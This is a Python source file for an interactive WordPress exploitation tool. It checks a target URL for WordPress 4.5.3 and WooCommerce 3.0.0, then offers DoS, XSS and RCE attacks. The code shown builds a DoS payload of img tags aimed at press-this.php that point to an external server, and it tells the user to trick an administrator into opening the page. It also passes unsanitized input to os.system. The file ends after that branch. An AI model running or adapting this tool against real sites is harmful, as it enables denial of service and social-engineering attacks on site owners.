#Wordpress exploiting tool designed by DavideCube
#Works on Wordpress version <= 4.5.3 and the WooCommerce Plugin version
from bs4 import BeautifulSoup
import re
import urllib.request
import os
from modules import Support



#create the exploit list, to be used later
my_list = []

my_list.append(Support.Exploit('dos', 'Simple DoS Attack', 1)) #only on WordPress 4.5.3
my_list.append(Support.Exploit('xss', 'XSS attack', 1)) #only on WordPress 4.5.3
my_list.append(Support.Exploit('xss+dos', 'XSS with Dos', 1)) #only on WordPress 4.5.3
my_list.append(Support.Exploit('rce', 'WooCommerce RCE', 1)) #only on WooCommerce .... 

#print main menu
print("\n")
print("******************************************************************")
print("*                                                                *")
print("*         Welcome to the Wordpressing Exploiting Tool!!          *")
print("*                                                                *")
print("******************************************************************")
print("*         The tool will check if the available exploits          *")
print("*         are applicable to the wordpress site you provide.      *")
print("******************************************************************")
print("\n")
url = input("Please provide a complete wordpress url: ")

print("The target is", url)

data = urllib.request.urlopen(url).read() #read the content of the webpage

soup = BeautifulSoup(data, 'html.parser') #parse the html code

#Check if the Wordpress version is the correct one
element = soup.find('meta', attrs={'name':'generator','content':'WordPress 4.5.3'})

if element is None:
	print("The target site is not based on Wordpress 4.5.3")
	my_list[0].executable = 0
	my_list[1].executable = 0
	my_list[2].executable = 0

#now check if we can execute the Woocommerce RCE
element =  soup.find('meta', attrs={'name':'generator','content':'WooCommerce 3.0.0'})

if element is None:
	print("The target site does not have WooCommerce 3.0.0")
	my_list[3].executable = 0

#if no checkboxes, stop program
if not(Support.exploits_possible(my_list)):
	print("No exploits available")
	exit()


for i in range(len(my_list)): 
	if my_list[i].executable == 1:
		print( (i+1), ") ", my_list[i].desc, u'\u2713')
	else:
		print( (i+1), ") ", my_list[i].desc)



#allow the user to select which exploit to execute
print("\n")
choice = input("Please choose which available exploit to execute: ")

#control the validity of the inserted choice https://www.google.it
while not(Support.is_valid_number(choice)) or my_list[int(choice)].executable == 0:
	if not(Support.is_valid_number(choice)):
		print("You must insert a number between 1 and 4.")
		choice = input("Please choose which available exploit to execute: ")
	else:
		print("The exploit is not available, make sure the option is checked.")
		choice = input("Please choose which available exploit to execute: ")

choice_num = int(choice)
print("\n")

#work on the choices http://10.7.152.98:3000/wordpress

# DOS
if choice_num == 1:
	print("******************************************************************")
	print("*        				 DOS attack          					*")
	print("******************************************************************") 
	print("In order to perform this exploit, you need at least a subscriber account.")
	username = input("Insert username: ")
	password = input("Insert password: ")
	os.system("sh modules/dos.sh " + url + " " + username + " " + password)

# XSS + DOS 
elif choice_num == 3:
	print("******************************************************************")
	print("*        				 XSS + DOS attack          				*")
	print("******************************************************************") 
	print("In order to perform this exploit, you need an external server. Move the foo.txt file that you find in the modules folder on your server.")
	ipaddress = input("Put here the IP address of the external server: ")
	wp_url = url + 'wp-admin/'
	external_server = 'http://10.7.152.98:3000/davidecube_xss/foo.txt'
	external_parsed = urllib.parse.quote(external_server, safe='')
	item = '<img src=\'' + url + '/wp-admin/press-this.php?u=' + external_parsed + '&url-scan-submit=Scan&a=b\'>'
	external_file = open("modules/dos.html", "w")
	for i in range(25):
		external_file.write(item)

	print("At this point a file dos.html is generated in the modules folder. Move also this file somewhere.")
	print("Convince an administrator to visit that webpage. This would perform a DOS attack.")










	




